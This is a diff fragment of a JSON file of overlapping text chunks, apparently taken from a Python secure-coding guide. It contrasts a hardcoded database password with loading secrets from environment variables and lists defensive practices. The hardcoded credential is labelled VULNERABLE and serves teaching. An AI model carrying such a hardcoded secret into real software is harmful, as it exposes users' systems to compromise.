+    "text": "s Management\n\n```python\n# VULNERABLE\nDB_PASSWORD = \"admin123\"\n\n# SAFE\nimport os\nfrom dotenv import load_dotenv\nload_dotenv()\nDB_PASSWORD = os.environ[\"DB_PASSWORD\"]\n```\n\n## Security Checklist\n\n- [ ] Never use `eval()` or `exec()` with external data\n- [ ] Always use `shell=False` in subprocess calls\n- [ ] Never deserialize pickle from untrusted sources\n- [ ] Use parameterized queries for all database access\n- [ ] Validate and sanitize all file paths\n- [ ] Store all secrets in environment variable"
+  },
+  {
+    "source": "secure_coding/python_secure_coding.md",
+    "text": "hs\n- [ ] Store all secrets in environment variables\n- [ ] Use `secrets` module for cryptographic randomness (not `random`)"
+  }
+]
